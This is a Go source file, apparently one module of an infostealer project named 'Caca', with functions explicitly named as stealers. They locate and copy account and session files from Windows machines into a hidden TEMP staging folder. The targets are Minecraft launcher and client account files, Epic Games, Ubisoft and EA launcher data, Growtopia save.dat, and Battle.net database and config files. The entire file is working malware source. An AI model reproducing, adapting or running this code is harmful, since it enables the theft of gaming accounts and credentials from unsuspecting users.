package Games

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"Caca/pkg/common"
)

func Run()  {
	games2save := filepath.Join(os.Getenv("TEMP"), strings.ToLower(os.Getenv("USERNAME")), "games")
    err := os.MkdirAll(games2save, 0755)
	if err != nil {
		fmt.Println("Error creating directory: %v\n", err)
	}

	Minecraftstealer(games2save)
	Epicgames_stealer(games2save)
	Ubisoftstealer(games2save)
	Electronic_arts(games2save)
	Growtopiastealer(games2save)
	Battle_net_stealer(games2save)
}

func Minecraftstealer(games2save string)  {

	minecraftPaths := map[string]string{
		"Intent":          filepath.Join(os.Getenv("USERPROFILE"), "intentlauncher", "launcherconfig"),
		"Lunar":           filepath.Join(os.Getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
		"TLauncher":       filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
		"Feather":         filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".feather", "accounts.json"),
		"Meteor":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
		"Impact":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
		"Novoline":        filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
		"CheatBreakers":   filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
		"Microsoft Store": filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
		"Rise":            filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
		"Rise (Intent)":   filepath.Join(os.Getenv("USERPROFILE"), "intentlauncher", "Rise", "alts.txt"),
		"Paladium":        filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "paladium-group", "accounts.json"),
		"PolyMC":          filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "PolyMC", "accounts.json"),
		"Badlion":         filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Badlion Client", "accounts.json"),
	}

	for _, path := range minecraftPaths {
		if _, err := os.Stat(path); err == nil {
			common.CopyFile(path, filepath.Join(games2save, "Minecraft", filepath.Base(path)))
		}
	}
}

func Epicgames_stealer(games2save string)  {
	epicgamesfolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher")
	if _, err := os.Stat(epicgamesfolder); os.IsNotExist(err) {
		return
	} 

	common.CopyDir(filepath.Join(epicgamesfolder, "Saved", "Config"), filepath.Join(games2save, "EpicGames", "Config"))
	common.CopyDir(filepath.Join(epicgamesfolder, "Saved", "Logs"), filepath.Join(games2save, "EpicGames", "Logs"))
	common.CopyDir(filepath.Join(epicgamesfolder, "Saved", "Data"), filepath.Join(games2save, "EpicGames", "Data"))

}

func Ubisoftstealer(games2save string)  {
	ubisoftfolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
	if _, err := os.Stat(ubisoftfolder); os.IsNotExist(err) {
		return
	}

	common.CopyDir(ubisoftfolder, filepath.Join(games2save, "Ubisoft"))
}


func Electronic_arts(games2save string) {
	eafolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Electronic Arts", "EA Desktop", "CEF")
	if _, err := os.Stat(eafolder); os.IsNotExist(err) {
		return
	}

	parentDirName := filepath.Base(filepath.Dir(eafolder))
	destination := filepath.Join(games2save, "Electronic Arts", parentDirName)
	common.CopyDir(eafolder, destination)
}

func Growtopiastealer(games2save string) {
	growtopiafolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "Growtopia")
	if _, err := os.Stat(growtopiafolder); os.IsNotExist(err) {
		return
	}

	saveFile := filepath.Join(growtopiafolder, "save.dat")
	if _, err := os.Stat(saveFile); os.IsNotExist(err) {
		fmt.Printf("Save file %s not found\n", saveFile)
		return
	}

	common.CopyFile(saveFile, filepath.Join(games2save, "Growtopia", "save.dat"))
}

func Battle_net_stealer(games2save string) {
	battle_folder := filepath.Join(os.Getenv("APPDATA"), "Battle.net")
	if _, err := os.Stat(battle_folder); os.IsNotExist(err) {
		return
	}

	files, err := ioutil.ReadDir(battle_folder)
	if err != nil {
		fmt.Printf("Error reading directory: %v\n", err)
		return
	}

	for _, file := range files {
		if !file.IsDir() && (filepath.Ext(file.Name()) == ".db" || filepath.Ext(file.Name()) == ".config") {
			common.CopyFile(filepath.Join(battle_folder, file.Name()), filepath.Join(games2save, "Battle.net", file.Name()))
		}
	}
}